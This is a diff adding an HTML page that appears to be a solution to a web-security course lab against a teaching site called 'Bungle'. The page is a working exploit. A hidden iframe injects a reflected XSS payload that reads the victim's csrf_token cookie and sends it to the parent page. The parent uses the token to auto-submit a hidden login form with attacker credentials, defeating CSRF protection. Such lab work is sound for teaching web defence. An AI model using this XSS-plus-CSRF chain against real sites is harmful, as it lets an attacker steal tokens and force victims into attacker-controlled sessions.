@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+  <head>
+	
+	<script>
+		window.addEventListener("message", (event) => { 
+document.getElementById("csrf_token").value = event.data;
+document.spot.submit(); });
+	</script>
+	
+    <title>BUNGLE! Login</title>
+  </head>
+ <body style="Display: none;">
+   
+<iframe name="trgt" src="https://bungle.sysnet.ucsd.edu/search?q=<script>window.parent.postMessage%28document.cookie.split%28%27%3B+%27%29.filter%28keyVal%3D>%7Breturn+keyVal.split%28%27%3D%27%29%5B0%5D%3D%3D%3D%27csrf_token%27%7D%29%5B0%5D.substring%2811%29%2C%27*%27%29%3B<%2Fscript>"></iframe>
+
+    <form type = "hidden" name="spot" method="POST" action="https://bungle.sysnet.ucsd.edu/login?csrfdefense=1&xssdefense=0" target="trgt">
+      <label for="username">Username:</label>
+
+      <input type="text" id="username" name="username" value="attacker"><br><br>
+      <label for="password">Password:</label>
+      <input type="password" id="password" name="password" value="l33th4x"><br><br>
+
+      <input type="submit" value="Login">
+	<input type="text" id="csrf_token" name="csrf_token">
+    </form>
+  </body>
+</html>
